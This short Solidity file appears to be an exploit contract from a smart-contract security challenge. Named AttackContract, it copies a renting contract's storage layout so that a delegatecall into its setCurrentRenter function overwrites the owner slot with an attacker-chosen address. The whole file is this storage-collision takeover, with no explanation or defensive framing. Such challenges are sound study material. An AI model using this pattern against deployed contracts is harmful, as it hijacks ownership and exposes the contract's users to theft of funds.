// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

contract AttackContract {
    address public rentingLibrary;
    address public owner;
    uint256 public pricePerDay;
    uint256 public rentedUntil;
    uint256 public currentRenter;

    constructor() {

    }

    function setCurrentRenter(uint256 _renterId) public {
        owner = address(uint160(uint256(_renterId)));
    }
}